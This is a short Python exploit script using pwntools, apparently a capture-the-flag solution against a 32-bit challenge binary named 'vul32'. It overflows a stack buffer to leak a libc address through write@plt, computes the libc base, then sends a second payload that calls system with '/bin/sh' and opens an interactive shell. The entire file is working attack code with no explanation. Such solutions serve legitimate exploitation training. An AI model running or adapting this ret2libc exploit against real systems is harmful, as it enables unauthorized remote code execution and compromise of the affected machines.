##!/usr/bin/env python

from pwn import *

# sh = remote("cssc.vul337.team", 49241)
sh = process('./vul32')

vul32 = ELF('./vul32')
libc = ELF('./libc.so.6')

libc_start_main_got = vul32.got['__libc_start_main']
write_plt = vul32.plt['write']
main = vul32.symbols['main']
system_offset = libc.sym['system']

print("leak libc_start_main_got addr and return to main again")
# to determine the offset
payload = flat(
    ['A' * 112, write_plt, main,
     p32(1), libc_start_main_got,
     p32(4)])
sh.sendlineafter('Can you find it !?', payload)

print("get the related addr")
libc_start_main_addr = u32(sh.recv()[0:4])
libcbase = libc_start_main_addr - libc.sym['__libc_start_main']
system_addr = libcbase + libc.sym['system']
binsh_addr = libcbase + libc.sym['str_bin_sh']

print("get shell")
payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])

sh.sendline(payload)

sh.interactive()